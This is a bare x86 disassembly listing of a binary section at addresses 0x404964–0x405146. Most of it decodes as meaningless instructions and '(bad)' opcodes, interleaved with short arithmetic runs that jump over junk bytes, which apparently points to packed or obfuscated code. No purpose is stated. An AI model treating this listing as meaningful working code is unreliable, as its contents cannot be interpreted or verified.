  404964:	inc    esi
  404965:	out    dx,eax
  404966:	xor    al,0xb0
  404968:	cld    
  404969:	inc    edi
  40496a:	jl     0x4049c9
  40496c:	aaa    
  40496d:	ret    0xc25f
  404970:	jge    0x404957
  404972:	sbb    eax,0xe029b021
  404977:	push   ecx
  404978:	or     dh,BYTE PTR [edx+0x1563ad61]
  40497e:	and    esp,DWORD PTR [eax]
  404980:	sbb    ecx,DWORD PTR [ebx]
  404982:	sbb    ah,bl
  404984:	push   0xffffffa6
  404986:	lock gs push ds
  404989:	push   ds
  40498a:	sbb    eax,0xc72674aa
  40498f:	mov    DWORD PTR [ecx],eax
  404991:	bound  edi,QWORD PTR [edi-0x3a46f88b]
  404997:	js     0x4049cd
  404999:	retf   0xa3e9
  40499c:	inc    eax
  40499d:	jmp    0xb5f43095
  4049a2:	rcl    ebx,0x77
  4049a5:	cmp    BYTE PTR [ebx+0x8],dl
  4049a8:	and    al,0xa
  4049aa:	nop
  4049ab:	jne    0x404963
  4049ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049ae:	popf   
  4049af:	cmc    
  4049b0:	sub    esi,DWORD PTR [esi+0x57]
  4049b3:	repnz mov bh,0xa2
  4049b6:	dec    ebp
  4049b7:	clc    
  4049b8:	fadd   QWORD PTR ds:0xe170e512
  4049be:	inc    esi
  4049bf:	xor    DWORD PTR [ebx],0xec5503d0
  4049c5:	jmp    0x404b6f
  4049ca:	test   BYTE PTR [ebp-0x13],cl
  4049cd:	xor    edi,ebp
  4049cf:	push   ebx
  4049d0:	mov    esp,0xd1280b5d
  4049d5:	xor    edi,eax
  4049d7:	mov    bh,0x12
  4049d9:	sahf   
  4049da:	xchg   ecx,eax
  4049db:	sub    al,0x7e
  4049dd:	jle    0x40496a
  4049df:	jg     0x404a5f
  4049e1:	jle    0x4049d7
  4049e3:	sar    DWORD PTR ds:[edi-0x5d15ac48],1
  4049ea:	inc    esp
  4049eb:	push   ds
  4049ec:	adc    al,0xb9
  4049ee:	ret    0x85e3
  4049f1:	jle    0x4049c5
  4049f3:	mov    ch,0x44
  4049f5:	lock cmp al,0x13
  4049f8:	xchg   DWORD PTR [edi+ecx*1+0x4e],esp
  4049fc:	aaa    
  4049fd:	test   eax,0x693b1c32
  404a02:	repz rcr esi,cl
  404a05:	int    0xfb
  404a07:	cmp    DWORD PTR [eax+eax*2-0x5153f24f],0xde33a71c
  404a12:	das    
  404a13:	sahf   
  404a14:	jno    0x404a20
  404a16:	and    eax,0x3d1e7f79
  404a1b:	xchg   BYTE PTR [eax-0x5],bl
  404a1e:	leave  
  404a1f:	sub    edx,DWORD PTR [edi+0x10cdb660]
  404a25:	daa    
  404a26:	in     al,dx
  404a27:	sub    DWORD PTR [ebp+0x39],ebp
  404a2a:	add    eax,0x19d6d5ab
  404a2f:	out    0xb4,al
  404a31:	inc    ebp
  404a32:	packssdw mm5,QWORD PTR [edi-0x18f3305]
  404a39:	xchg   ecx,eax
  404a3a:	add    esp,DWORD PTR [edi-0x4e]
  404a3d:	jle    0x404aa0
  404a3f:	xor    DWORD PTR [ebx],edx
  404a41:	aam    0x53
  404a43:	shl    ebp,cl
  404a45:	sub    ecx,DWORD PTR [edx]
  404a47:	sub    BYTE PTR [ecx-0x485f8208],bh
  404a4d:	add    BYTE PTR [ecx+0xa525a63],al
  404a53:	mov    cl,0xc9
  404a55:	inc    ebp
  404a56:	jp     0x404a89
  404a58:	aad    0x40
  404a5a:	sbb    ecx,DWORD PTR [esi]
  404a5c:	mov    WORD PTR [ebx+0x59eab349],cs
  404a62:	test   DWORD PTR [eax+0x29],ebp
  404a65:	jmp    0x1075:0xf94d0049
  404a6c:	pop    edx
  404a6d:	fnstcw WORD PTR ss:[ecx]
  404a70:	sub    BYTE PTR [edx+edx*2-0x39],0xe7
  404a75:	pop    ds
  404a76:	xchg   DWORD PTR [ebp-0x37],edx
  404a79:	out    0x9b,eax
  404a7b:	aaa    
  404a7c:	cmp    esi,DWORD PTR [edx+0x4e78b369]
  404a82:	sbb    ebx,DWORD PTR [eax+0xa79ed26]
  404a88:	xchg   esp,eax
  404a89:	mov    al,ds:0x592ffcd8
  404a8e:	push   ebx
  404a8f:	cmp    eax,0x1df35ed1
  404a94:	dec    ebp
  404a95:	jb     0x404ab6
  404a97:	xlat   BYTE PTR ds:[ebx]
  404a98:	jg     0x404a35
  404a9a:	(bad)  
  404a9b:	fidivr DWORD PTR [esi+ebp*8+0xe0beee5]
  404aa2:	xchg   esi,eax
  404aa3:	sbb    eax,0x66b95be8
  404aa8:	not    BYTE PTR [esi]
  404aaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404aab:	push   ecx
  404aac:	mov    dl,0xa2
  404aae:	mov    ch,0x39
  404ab0:	inc    ebp
  404ab1:	shl    DWORD PTR [edi-0xd1ebc93],0xc0
  404ab8:	xor    BYTE PTR [esi],ah
  404aba:	cmp    eax,0xf13023ef
  404abf:	(bad)  
  404ac1:	repz fcomp QWORD PTR [ebp+0x4c]
  404ac5:	out    dx,al
  404ac6:	out    dx,eax
  404ac7:	pop    ecx
  404ac8:	mov    ch,0x3f
  404aca:	xchg   BYTE PTR [ebp+eax*8+0x6220416c],bh
  404ad1:	dec    ecx
  404ad2:	das    
  404ad3:	or     ebp,eax
  404ad5:	jb     0x404a7d
  404ad7:	cmp    eax,0x60dccf03
  404adc:	iret   
  404add:	sub    eax,0x7eda7999
  404ae2:	xchg   ebx,eax
  404ae3:	inc    esp
  404ae4:	aad    0x73
  404ae6:	dec    esp
  404ae7:	or     eax,0x35ea5b7a
  404aec:	pop    edi
  404aed:	icebp  
  404aee:	mov    edx,0x82f30a42
  404af3:	ins    BYTE PTR es:[edi],dx
  404af4:	sub    BYTE PTR [ecx+0x2c4d3c9],0xda
  404afb:	test   DWORD PTR [edx-0x30660f8d],edx
  404b01:	repz sub ah,0xaf
  404b05:	int    0xe3
  404b07:	xlat   BYTE PTR ds:[ebx]
  404b08:	inc    eax
  404b09:	mov    ?,WORD PTR [ecx-0x62f7d580]
  404b0f:	es ret 
  404b11:	fs push ds
  404b13:	mov    ch,0xcb
  404b15:	dec    ecx
  404b16:	or     eax,0xc86b46a6
  404b1b:	fiadd  WORD PTR [edi]
  404b1d:	stos   BYTE PTR es:[edi],al
  404b1e:	outs   dx,DWORD PTR ds:[esi]
  404b1f:	mov    bl,0x54
  404b21:	xchg   ebx,eax
  404b22:	mov    dl,0x67
  404b24:	cmp    cl,BYTE PTR [esi-0x29]
  404b27:	push   es
  404b28:	call   0x9ba055ee
  404b2d:	xor    al,0x1d
  404b2f:	aaa    
  404b30:	sub    DWORD PTR [esi],edi
  404b32:	push   cs
  404b33:	xor    BYTE PTR [ebx-0x5],0xb0
  404b37:	scas   al,BYTE PTR es:[edi]
  404b38:	jae    0x404b2f
  404b3a:	mov    dh,0x75
  404b3c:	pop    ebp
  404b3d:	and    bl,BYTE PTR [ebx+0x7]
  404b40:	in     al,dx
  404b41:	push   esp
  404b42:	rol    DWORD PTR [ebp+0x58],0x57
  404b46:	ds mov cl,0xdc
  404b49:	retf   0x3261
  404b4c:	jne    0x404b15
  404b4e:	mov    ds:0x409487f9,eax
  404b53:	sub    eax,0xba01de0f
  404b58:	(bad)  [edx+0x3c]
  404b5b:	shl    dh,0x79
  404b5e:	pop    es
  404b5f:	push   ecx
  404b60:	push   ecx
  404b61:	mov    sp,0x41ab
  404b65:	dec    eax
  404b66:	jbe    0x404bd2
  404b68:	js     0x404bcd
  404b6a:	out    0x76,al
  404b6c:	mov    edx,fs
  404b6e:	adc    BYTE PTR [ebx-0x6b751b83],cl
  404b74:	cmp    bl,BYTE PTR [ebp-0x77ffcd8e]
  404b7a:	push   ebp
  404b7b:	or     ecx,DWORD PTR [edx+0x7d8b0f55]
  404b81:	hlt    
  404b82:	xor    edi,eax
  404b84:	add    edi,DWORD PTR [ebp-0x14]
  404b87:	jmp    0x404d31
  404b8c:	in     al,dx
  404b8d:	push   esi
  404b8e:	adc    dh,BYTE PTR [eax+0x6a6c4c94]
  404b94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b95:	(bad)  
  404b96:	aas    
  404b97:	push   eax
  404b98:	push   esp
  404b99:	ja     0x404b1e
  404b9b:	mov    eax,0x7e7e2e2e
  404ba0:	mov    edi,DWORD PTR [edi+0x7e]
  404ba3:	jle    0x404c24
  404ba5:	mov    WORD PTR [ecx+0x73],ss
  404ba8:	stc    
  404ba9:	ja     0x404bb9
  404bab:	and    bh,dh
  404bad:	jge    0x404ba4
  404baf:	xor    al,0x31
  404bb1:	ror    BYTE PTR [esi],1
  404bb3:	scas   eax,DWORD PTR es:[edi]
  404bb4:	pop    edi
  404bb5:	in     eax,0xeb
  404bb7:	sbb    edx,DWORD PTR [edx]
  404bb9:	and    al,0x43
  404bbb:	(bad)  
  404bbc:	cmp    eax,0x682f3cf8
  404bc1:	jge    0x404b5f
  404bc3:	adc    BYTE PTR [edi+0x4a0fc97f],dh
  404bc9:	xor    al,0x44
  404bcb:	arpl   WORD PTR [edx+0x73f685da],di
  404bd1:	mov    ebx,0x3efab48
  404bd6:	adc    BYTE PTR [esi+0x240eefb],dl
  404bdc:	sbb    eax,0x65040f8f
  404be1:	in     eax,0xb7
  404be3:	leave  
  404be4:	iret   
  404be5:	inc    esp
  404be6:	inc    ecx
  404be7:	out    0xf7,al
  404be9:	mov    edi,DWORD PTR [eax+0x7d]
  404bec:	imul   ebx,DWORD PTR [ecx+ebx*2+0x22],0xfffffff7
  404bf1:	jnp    0x404bf2
  404bf3:	jbe    0x404be9
  404bf5:	icebp  
  404bf6:	enter  0xd35a,0x3a
  404bfa:	pop    ecx
  404bfb:	and    eax,0x51752bb
  404c00:	cmp    al,0x41
  404c02:	sbb    BYTE PTR [eax-0x44bf77ca],ch
  404c08:	mov    ecx,ebx
  404c0a:	mov    ecx,ebx
  404c0c:	mov    ds:0x13e7697c,al
  404c11:	fld    TBYTE PTR [esi]
  404c13:	rcr    BYTE PTR [ecx-0x74b63f99],0xf
  404c1a:	rcl    ebx,1
  404c1c:	inc    edi
  404c1d:	test   al,0x7b
  404c1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c20:	mov    dh,0x52
  404c22:	cs jno 0x404bda
  404c25:	and    DWORD PTR [edi],0xb0f063ad
  404c2b:	and    eax,DWORD PTR [edx+0x64]
  404c2e:	cwde   
  404c2f:	push   edi
  404c30:	mov    ch,0xe3
  404c32:	mov    eax,ds:0xa171e50f
  404c37:	gs icebp 
  404c39:	cs in  eax,0x46
  404c3c:	xor    BYTE PTR [ebx+0x5f96cf1b],dl
  404c42:	cmp    eax,0x7a1719b9
  404c47:	or     edi,DWORD PTR [ebx-0x3f]
  404c4a:	sub    DWORD PTR [edi+0x36],ecx
  404c4d:	fcomip st,st(5)
  404c4f:	xchg   edi,eax
  404c50:	retf   0xa068
  404c53:	out    0xc6,eax
  404c55:	sbb    BYTE PTR ds:0x38d3f420,bh
  404c5b:	cli    
  404c5c:	sbb    BYTE PTR [edi],cl
  404c5e:	pop    ebp
  404c5f:	inc    ebx
  404c60:	in     al,dx
  404c61:	or     DWORD PTR [ebx+edi*2+0x5e],0xf7874c8c
  404c69:	lods   al,BYTE PTR ds:[esi]
  404c6a:	hlt    
  404c6b:	into   
  404c6c:	(bad)  
  404c6d:	xchg   edx,eax
  404c6e:	sbb    ebx,DWORD PTR [ebx-0x74]
  404c71:	ds dec eax
  404c73:	or     DWORD PTR [ecx+ecx*1],ebx
  404c76:	in     eax,dx
  404c77:	(bad)  
  404c79:	sub    edi,DWORD PTR [ecx+0x30]
  404c7c:	add    eax,0x2c533d70
  404c81:	mov    ds:0xf99031c1,al
  404c86:	aas    
  404c87:	xchg   esp,eax
  404c88:	lods   eax,DWORD PTR ds:[esi]
  404c89:	xchg   DWORD PTR [edi],ebp
  404c8b:	push   edx
  404c8c:	mov    BYTE PTR [ecx-0x18432311],bl
  404c92:	ins    BYTE PTR es:[edi],dx
  404c93:	adc    eax,DWORD PTR [eax]
  404c95:	mov    dh,0x19
  404c97:	hlt    
  404c98:	clc    
  404c99:	or     BYTE PTR [eax+0x38],dl
  404c9c:	ror    ecx,cl
  404c9e:	sub    dh,bl
  404ca0:	mov    cl,0x8
  404ca2:	cmp    DWORD PTR [edi],0xffffff86
  404ca5:	sub    al,0x1e
  404ca7:	pop    edx
  404ca8:	in     eax,dx
  404ca9:	loop   0x404c96
  404cab:	jbe    0x404ce2
  404cad:	push   cs
  404cae:	pop    ds
  404caf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cb0:	mov    es,WORD PTR [ebx-0x72]
  404cb3:	add    edx,esp
  404cb5:	cmp    DWORD PTR [esi],ecx
  404cb7:	test   BYTE PTR [ebx],bh
  404cb9:	sbb    bh,bh
  404cbb:	ds inc ebp
  404cbd:	imul   ebx,DWORD PTR [edx-0xb],0x1d
  404cc1:	xchg   esi,eax
  404cc2:	or     al,0x5
  404cc4:	dec    esi
  404cc5:	mov    ecx,0x308068a
  404cca:	ja     0x404cae
  404ccc:	jg     0x404cec
  404cce:	ror    DWORD PTR [esi-0x32],1
  404cd1:	fs inc esp
  404cd3:	adc    esp,esi
  404cd5:	mov    edx,0x7b8a9db3
  404cda:	jne    0x404d1e
  404cdc:	sti    
  404cdd:	jo     0x404c69
  404cdf:	xchg   DWORD PTR [ebp-0x76],edi
  404ce2:	dec    edi
  404ce3:	sar    BYTE PTR [ecx-0x7be72244],cl
  404ce9:	popa   
  404cea:	cdq    
  404ceb:	lods   eax,DWORD PTR ds:[esi]
  404cec:	ja     0x404d48
  404cee:	ss pop edi
  404cf0:	fistp  DWORD PTR [eax+0x4f8ed61e]
  404cf6:	scas   al,BYTE PTR es:[edi]
  404cf7:	push   0x1f31dcb8
  404cfc:	sahf   
  404cfd:	inc    BYTE PTR [ecx-0x4e]
  404d00:	(bad)  
  404d01:	cmp    BYTE PTR [edi-0x422d2927],ah
  404d07:	(bad)  [ecx-0x35]
  404d0a:	xchg   BYTE PTR [ebp-0x17],dh
  404d0d:	daa    
  404d0e:	fcom   QWORD PTR ds:0x84659d93
  404d14:	lock cmp ebp,ebp
  404d17:	(bad)  
  404d18:	mov    ebx,0x5db7e91
  404d1d:	pop    esi
  404d1e:	inc    BYTE PTR [ebp-0x7d]
  404d21:	in     al,0x13
  404d23:	xchg   ebp,eax
  404d24:	xor    DWORD PTR ds:0x24d19b11,ebx
  404d2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d2b:	push   edx
  404d2c:	ret    
  404d2d:	mov    ds:0x8b50227f,eax
  404d32:	pop    ebp
  404d33:	in     al,0x88
  404d35:	xchg   esp,eax
  404d36:	pop    ds
  404d37:	popf   
  404d38:	jb     0x404d6c
  404d3a:	add    BYTE PTR [edx+0x7d8b0b55],cl
  404d40:	call   0x7d444578
  404d45:	in     al,dx
  404d46:	mov    ebx,DWORD PTR [ebp-0x1c]
  404d49:	mov    BYTE PTR [edi+ebx*1+0x32729d],dl
  404d50:	mov    edx,DWORD PTR [ebp-0x44]
  404d53:	mov    edi,DWORD PTR [ebp-0xc]
  404d56:	xor    edx,eax
  404d58:	xor    edi,eax
  404d5a:	add    edx,ecx
  404d5c:	add    edi,ecx
  404d5e:	imul   edx,edi
  404d61:	add    edx,DWORD PTR [ebp-0x14]
  404d64:	mov    DWORD PTR [ebp-0x14],edx
  404d67:	mov    edx,DWORD PTR [ebp-0xc]
  404d6a:	mov    edi,DWORD PTR [ebp-0x24]
  404d6d:	xor    edx,eax
  404d6f:	add    edx,ecx
  404d71:	imul   edx,edi
  404d74:	mov    edi,DWORD PTR [ebp-0xc]
  404d77:	xor    edi,eax
  404d79:	sub    edx,edi
  404d7b:	mov    edi,DWORD PTR [ebp-0xc]
  404d7e:	mov    ebx,DWORD PTR [ebp-0x14]
  404d81:	jmp    0x404f2b
  404d86:	test   DWORD PTR [ebp+0x21bc10ba],0xf561ad9d
  404d90:	xchg   ebp,eax
  404d91:	and    bh,ch
  404d93:	scas   al,BYTE PTR es:[edi]
  404d94:	add    edi,DWORD PTR [edx-0x45]
  404d97:	das    
  404d98:	jle    0x404e18
  404d9a:	mov    edi,DWORD PTR [edi+0x7e]
  404d9d:	jle    0x404dcb
  404d9f:	mov    bl,BYTE PTR [edi+0x12]
  404da2:	cmc    
  404da3:	iret   
  404da4:	adc    al,0x77
  404da6:	dec    ebp
  404da7:	(bad)  
  404da8:	sti    
  404da9:	ja     0x404d34
  404dab:	addr16 loop 0x404de4
  404dae:	mov    al,0xb6
  404db0:	cdq    
  404db1:	lods   al,BYTE PTR ds:[esi]
  404db2:	push   ds
  404db3:	sbb    dh,al
  404db5:	jne    0x404d54
  404db7:	icebp  
  404db8:	jmp    0x38d5:0x13e03a42
  404dbf:	sbb    eax,0x1d39e5db
  404dc4:	adc    dh,BYTE PTR [edi]
  404dc6:	jp     0x404e45
  404dc8:	ror    DWORD PTR [ecx-0x5e3dea7f],1
  404dce:	xchg   ecx,eax
  404dcf:	test   ebp,ebp
  404dd1:	std    
  404dd2:	xchg   esp,eax
  404dd3:	sub    edx,esp
  404dd5:	pushf  
  404dd6:	mov    al,ds:0xc42e7c42
  404ddb:	xor    ecx,DWORD PTR [edx+ebx*8+0xc]
  404ddf:	repnz sub ebp,0xe585c48c
  404de6:	and    al,0xc2
  404de8:	cwde   
  404de9:	sbb    ah,BYTE PTR [ecx-0x32e46557]
  404def:	pop    esi
  404df0:	xor    DWORD PTR [ebx+0x48],ecx
  404df3:	call   DWORD PTR [ebp+eiz*1-0x36]
  404df7:	jae    0x404dd1
  404df9:	jae    0x404da3
  404dfb:	les    ebp,FWORD PTR [ebx]
  404dfd:	stos   BYTE PTR es:[edi],al
  404dfe:	pop    es
  404dff:	cmp    bl,0xd4
  404e02:	xlat   BYTE PTR ds:[ebx]
  404e03:	(bad)  
  404e04:	enter  0x4cf0,0x3f
  404e08:	mov    ds:0xbc1f4883,eax
  404e0d:	mov    cl,0x5d
  404e0f:	adc    ecx,DWORD PTR [edx-0x76]
  404e12:	sahf   
  404e13:	out    0x40,eax
  404e15:	lahf   
  404e16:	mov    eax,ds:0x50de73da
  404e1b:	test   ch,bl
  404e1d:	sub    eax,0x2aa5c0f
  404e22:	inc    ebx
  404e23:	loope  0x404e7d
  404e25:	or     dl,dl
  404e27:	add    al,0x75
  404e29:	cmp    DWORD PTR cs:[edi],esp
  404e2c:	test   BYTE PTR [esi-0x2bad8354],0xca
  404e33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e34:	out    dx,al
  404e35:	es clc 
  404e37:	xchg   edx,eax
  404e38:	push   ecx
  404e39:	jnp    0x404e58
  404e3b:	mov    ds:0x404a837d,al
  404e40:	mov    esp,0x7d79da97
  404e45:	fist   DWORD PTR [esp+eax*8]
  404e48:	fbld   TBYTE PTR [ebp-0x648f0e94]
  404e4e:	addr16 push esp
  404e50:	inc    esi
  404e51:	push   ebp
  404e52:	(bad)  
  404e53:	push   edi
  404e54:	mov    ds:0x43667e80,al
  404e59:	xchg   ebp,eax
  404e5a:	pop    ecx
  404e5b:	ret    
  404e5c:	(bad)  
  404e5d:	sub    eax,0x5adf725a
  404e62:	hlt    
  404e63:	mov    esi,0xd0f13443
  404e68:	mov    cl,0x3f
  404e6a:	aam    0x7b
  404e6c:	push   ecx
  404e6d:	out    dx,eax
  404e6e:	xchg   edx,eax
  404e6f:	nop
  404e70:	fadd   DWORD PTR [edi-0x53]
  404e73:	das    
  404e74:	leave  
  404e75:	std    
  404e76:	sbb    BYTE PTR [edx-0x59653673],dh
  404e7c:	lea    esi,[ebx+eiz*8]
  404e7f:	stos   BYTE PTR es:[edi],al
  404e80:	loop   0x404ed7
  404e82:	push   0xa0d5dcb3
  404e87:	div    BYTE PTR [ebx+0x5500102f]
  404e8d:	add    dh,BYTE PTR [edi-0x63c5e26]
  404e93:	xor    esp,DWORD PTR [ecx+0x3a]
  404e96:	inc    ebp
  404e97:	jmp    0xf36e:0xede4e0e9
  404e9e:	sub    eax,DWORD PTR [edi]
  404ea0:	jg     0x404e59
  404ea2:	cmp    BYTE PTR [edx+0x50],ch
  404ea5:	add    esp,edi
  404ea7:	cmp    DWORD PTR [eax-0x1705b5d1],eax
  404ead:	repnz xchg esp,eax
  404eaf:	cmc    
  404eb0:	jo     0x404e8e
  404eb2:	test   eax,0xa43683d8
  404eb7:	cmc    
  404eb8:	in     eax,0xed
  404eba:	dec    eax
  404ebb:	int3   
  404ebc:	aaa    
  404ebd:	pushf  
  404ebe:	stos   BYTE PTR es:[edi],al
  404ebf:	add    dl,BYTE PTR [ebx-0x13]
  404ec2:	popa   
  404ec3:	dec    edx
  404ec4:	(bad)  
  404ec6:	inc    DWORD PTR [edx+0x3d6d35ac]
  404ecc:	js     0x404e91
  404ece:	pusha  
  404ecf:	call   0x963245c9
  404ed4:	xchg   edi,eax
  404ed5:	and    esi,ebp
  404ed7:	pop    edi
  404ed8:	mov    ds:0x88e6b1b4,al
  404edd:	sub    BYTE PTR [edi],ah
  404edf:	adc    ebx,DWORD PTR [ebp+0x3a8296d2]
  404ee5:	das    
  404ee6:	mov    WORD PTR [eax],ss
  404ee8:	add    eax,0x9e4da8c3
  404eed:	pmuludq mm2,QWORD PTR [edi+eiz*2]
  404ef1:	scas   al,BYTE PTR es:[edi]
  404ef2:	mov    esp,DWORD PTR [edi]
  404ef4:	mov    ?,WORD PTR [edx]
  404ef6:	addr16 retf 0x4d71
  404efa:	inc    ebp
  404efb:	fwait
  404efc:	cmc    
  404efd:	pop    es
  404efe:	cmp    al,0xcb
  404f00:	test   DWORD PTR [edx-0x16],0x43c4bad1
  404f07:	std    
  404f08:	in     al,0x12
  404f0a:	imul   ebx
  404f0c:	add    DWORD PTR [ebp+0x747e9f77],esi
  404f12:	mov    ch,0x55
  404f14:	and    al,BYTE PTR [edi]
  404f16:	lods   eax,DWORD PTR ss:[esi]
  404f18:	popf   
  404f19:	sar    BYTE PTR [ebx+0x61],cl
  404f1c:	out    dx,al
  404f1d:	lds    esp,FWORD PTR [esi+eax*4]
  404f20:	jp     0x404f35
  404f22:	(bad)  
  404f24:	dec    edx
  404f25:	ins    DWORD PTR es:[edi],dx
  404f26:	push   0xffffffa4
  404f28:	repnz test eax,0x3f833a9
  404f2e:	stc    
  404f2f:	imul   edi,ebx
  404f32:	jmp    0x4050dc
  404f37:	mov    esp,0xfaa10ab4
  404f3c:	jns    0x404efb
  404f3e:	dec    ebp
  404f3f:	mov    edx,0xc9d15a29
  404f44:	mov    WORD PTR [eax],ss
  404f46:	aam    0xc8
  404f48:	and    DWORD PTR [esi+0x7e],edi
  404f4b:	mov    edi,DWORD PTR [edi+0x7e]
  404f4e:	jle    0x404edb
  404f50:	add    al,0x63
  404f52:	adc    eax,0x5abd8945
  404f57:	inc    edx
  404f58:	loopne 0x404f9e
  404f5a:	adc    al,BYTE PTR ds:0x14ea5f05
  404f60:	xchg   ebp,eax
  404f61:	(bad)  
  404f62:	mov    ecx,0xa4005aaf
  404f67:	sbb    al,0x24
  404f69:	and    BYTE PTR [edx+0xa489eb8],al
  404f6f:	add    al,0xfb
  404f71:	pop    ds
  404f72:	js     0x404fe5
  404f74:	and    eax,0xd91a74dc
  404f79:	xchg   ebx,eax
  404f7a:	pushf  
  404f7b:	dec    ebx
  404f7c:	jmp    0x2020:0xc8a3902b
  404f83:	in     eax,dx
  404f84:	imul   ebx,DWORD PTR [edx-0x6983bab7],0xad7fea44
  404f8e:	jl     0x404fdb
  404f90:	es call 0xacd94ac1
  404f96:	fistp  QWORD PTR [ebp-0x4c68457c]
  404f9c:	pop    ds
  404f9d:	and    al,0x34
  404f9f:	mov    ?,WORD PTR [ecx]
  404fa1:	xor    DWORD PTR [ecx+0x5351ecb0],esp
  404fa7:	cld    
  404fa8:	in     al,0xde
  404faa:	mov    ah,0xab
  404fac:	xor    al,0xf
  404faf:	cmp    dl,bl
  404fb1:	stc    
  404fb2:	pop    ebx
  404fb3:	das    
  404fb4:	mov    ds:0x6c7203a1,eax
  404fb9:	sub    cl,0x7f
  404fbc:	adc    esi,DWORD PTR [ebx-0x390e0]
  404fc2:	aam    0x8b
  404fc4:	arpl   WORD PTR [ebp+0x6d],si
  404fc7:	ret    
  404fc8:	cmp    DWORD PTR [edx-0x17cfbdd4],ebp
  404fce:	dec    esi
  404fcf:	adc    eax,0xf7c05f78
  404fd4:	das    
  404fd5:	data16 clc 
  404fd7:	add    eax,0x7679ffd8
  404fdc:	call   0x6dce1b91
  404fe1:	aaa    
  404fe2:	xor    eax,0xe9d21bc9
  404fe7:	inc    eax
  404fe8:	pop    esp
  404fe9:	(bad)  
  404fea:	shr    BYTE PTR [esp+edx*4+0x65],cl
  404fee:	inc    eax
  404fef:	push   edi
  404ff0:	push   ds
  404ff1:	scas   al,BYTE PTR es:[edi]
  404ff2:	daa    
  404ff3:	jns    0x405015
  404ff5:	test   al,0x66
  404ff7:	xchg   esp,eax
  404ff8:	retf   
  404ff9:	loopne 0x40504d
  404ffb:	or     al,0xe7
  404ffd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ffe:	ror    DWORD PTR [edx-0x6abab5c0],1
  405004:	popf   
  405005:	imul   ecx,DWORD PTR [ecx],0x558ebe14
  40500b:	ja     0x40504c
  40500d:	test   ebp,0x43b96961
  405013:	in     al,dx
  405014:	jl     0x405031
  405016:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405017:	loop   0x405019
  405019:	pop    edx
  40501a:	jl     0x404ff2
  40501c:	pop    eax
  40501d:	mov    edi,0x6f7c4f18
  405022:	cmc    
  405023:	xchg   edx,eax
  405024:	jno    0x404faa
  405026:	mov    ds:0xe59230ec,al
  40502b:	pop    eax
  40502c:	lock (bad) 
  40502e:	cmp    BYTE PTR [eax+0x2d1b99da],bl
  405034:	dec    esp
  405035:	dec    edx
  405036:	dec    esi
  405037:	out    dx,eax
  405038:	mov    DWORD PTR [edi+0x2ea8632d],ebx
  40503e:	mov    edi,0xc698a3f3
  405043:	dec    eax
  405044:	(bad)  
  405045:	push   edx
  405046:	(bad)  [eax+0x26]
  405049:	inc    esp
  40504a:	(bad)  
  40504b:	lea    esp,[edi]
  40504d:	mov    bh,0xf
  40504f:	mov    DWORD PTR [esi+0x3739be51],edx
  405055:	cmp    esp,ecx
  405057:	test   DWORD PTR [ecx],ecx
  405059:	lea    edi,[edi+0x649f23b4]
  40505f:	mov    ebp,0xdb38761
  405064:	popf   
  405065:	imul   esp,DWORD PTR [esi-0x80],0xc3e3a7d3
  40506c:	push   esi
  40506d:	mov    cl,0x27
  40506f:	xchg   DWORD PTR [ebx],ecx
  405071:	aad    0x13
  405073:	xor    eax,0x41951f81
  405078:	cmp    ebp,ebx
  40507a:	ret    0x39f5
  40507d:	mov    bl,BYTE PTR [ebx]
  40507f:	ret    
  405080:	imul   esp,DWORD PTR [esi+0x4af4b2c6],0x74027cd1
  40508a:	xor    dh,BYTE PTR [eax]
  40508c:	xchg   ecx,eax
  40508d:	mov    esi,0x4a72f39b
  405092:	inc    esi
  405093:	mov    eax,0x33e7a8c7
  405098:	push   ecx
  405099:	int    0x61
  40509b:	xchg   edx,eax
  40509c:	mov    al,BYTE PTR [edi]
  40509e:	das    
  40509f:	es fdiv st,st(7)
  4050a2:	dec    ebx
  4050a3:	lock pop ds
  4050a5:	cmp    esp,esp
  4050a7:	add    al,0xc3
  4050a9:	xchg   edi,eax
  4050aa:	jp     0x405064
  4050ac:	sub    ch,al
  4050ae:	cmp    DWORD PTR [ebp+0x59],ebx
  4050b1:	mov    ebp,0xb7f68ac2
  4050b6:	cmc    
  4050b7:	call   FWORD PTR [edx+0x27]
  4050ba:	mov    ch,0x6c
  4050bc:	retf   
  4050bd:	movsx  esp,bp
  4050c0:	pop    edi
  4050c1:	add    dl,dh
  4050c3:	fsub   QWORD PTR [ebp-0x78986623]
  4050c9:	ret    0x690
  4050cc:	push   ss
  4050cd:	std    
  4050ce:	xchg   ecx,eax
  4050cf:	sub    DWORD PTR [edi+0x156274f3],edx
  4050d5:	stos   BYTE PTR es:[edi],al
  4050d6:	imul   edx,DWORD PTR [edi-0x14],0x8b192b06
  4050dd:	pop    ebp
  4050de:	call   0xd16c2916
  4050e3:	lea    edi,[edi+ebx*1+0x32729d]
  4050ea:	cmp    edi,edx
  4050ec:	jbe    0x404654
  4050f2:	mov    edx,DWORD PTR [ebp-0xc]
  4050f5:	mov    edi,DWORD PTR [ebp-0x24]
  4050f8:	xor    edx,eax
  4050fa:	add    edx,ecx
  4050fc:	jmp    0x4052a6
  405101:	pop    edi
  405102:	mov    DWORD PTR [ebp+ebx*8-0x42980294],edx
  405109:	sbb    al,0x25
  40510b:	or     ebx,ecx
  40510d:	mov    esp,DWORD PTR [eax+esi*4]
  405110:	mov    DWORD PTR [ebp+0x22],eax
  405113:	jle    0x405193
  405115:	mov    edi,DWORD PTR [edi+0x7e]
  405118:	jle    0x40518c
  40511a:	shr    DWORD PTR [ebp-0x5d742c93],cl
  405120:	jae    0x4050a7
  405122:	cmp    al,0x7e
  405124:	xor    eax,0x9904e268
  405129:	jge    0x4050ed
  40512b:	stos   BYTE PTR es:[edi],al
  40512c:	and    al,dl
  40512e:	jbe    0x4050e4
  405130:	sub    eax,edx
  405132:	add    dh,BYTE PTR [ecx-0x3f]
  405135:	or     bh,dh
  405137:	out    0x5f,eax
  405139:	push   0x3c
  40513b:	(bad)  
  40513d:	stc    
  40513e:	push   ss
  40513f:	push   esp
  405140:	add    eax,0xf21ce1a7
  405145:	lods   eax,DWORD PTR ds:[esi]
  405146:	adc    BYTE PTR [esi-0x5c],bl
